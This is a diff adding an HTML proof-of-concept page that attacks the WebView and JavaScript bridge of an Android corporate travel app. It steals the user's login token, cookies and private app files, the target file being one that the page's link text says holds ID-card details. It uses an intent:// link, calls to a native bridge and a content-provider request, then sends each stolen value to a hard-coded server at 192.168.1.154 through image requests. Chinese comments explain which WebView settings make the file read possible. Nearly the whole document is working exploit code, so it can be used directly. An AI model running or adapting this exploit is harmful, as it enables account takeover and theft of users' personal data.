@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>get huitong token</title>
+</head>
+<body>
+
+<br>
+    <a href="intent://itravel.huawei.com/#Intent;component=huawei.w3.smartcom.itravel/huawei.w3.smartcom.itravel.business.welcome.WelcomeActivity;S.openurl=file:///data/data/huawei.w3.smartcom.itravel/shared_prefs/smartcom.itravel.xml;S.eventtype=3-02;S.title=cc;scheme=openitravel;end">查看token和身份证等信息</a>
+  </br>
+
+
+<script type="text/javascript">
+
+    function loginTokenCallback(token) {
+        document.body.appendChild(document.createElement("img")).src = "http://192.168.1.154:8080/wallet/" + token;
+        alert('token is' + token);
+		loadXMLDoc()
+    }
+
+<!--    window.nativeCB.bridgeGetLoginToken();-->
+
+    function bridgeLoginRespCallback(token) {
+        document.body.appendChild(document.createElement("img")).src = "http://192.168.1.154:8080/wallet/" + token;
+        alert('token is' + token);
+		loadXMLDoc()
+    }
+
+    window.nativeCB.bridgeLoginResp();
+
+	function loadXMLDoc()
+	{
+		alert('cookie is : ' + document.cookie);
+		var xmlhttp;
+		xmlhttp=new XMLHttpRequest();
+		xmlhttp.onreadystatechange=function()
+		{
+			if (xmlhttp.readyState==4 && xmlhttp.status==200)
+			{
+				document.body.appendChild(document.createElement("img")).src = "http://192.168.1.154:8080/wallet/" + xmlhttp.responseText;
+			}else{
+				document.body.appendChild(document.createElement("img")).src = "http://192.168.1.154:8080/wallet/error";
+			}
+		}
+    //通过content provider uri 获取私有目录下的文件（setAllowContentAccess未设置成false，理论上可以读取应用内所有content uri文件内容）
+		xmlhttp.open("GET","content://huawei.w3.smartcom.itravel.huawei.push.provider/push_notify_flag.xml",true);
+    //通过file协议，获取私有目录下的文件（但是因setAllowFileAccessFromFileURLs 未设置成true,无法读取成功）
+    //xmlhttp.open("GET","file:///data/data/huawei.w3.smartcom.itravel/shared_prefs/smartcom.itravel.xml",true);
+		xmlhttp.send();
+	}
+
+
+</script>
+</body>
+</html>
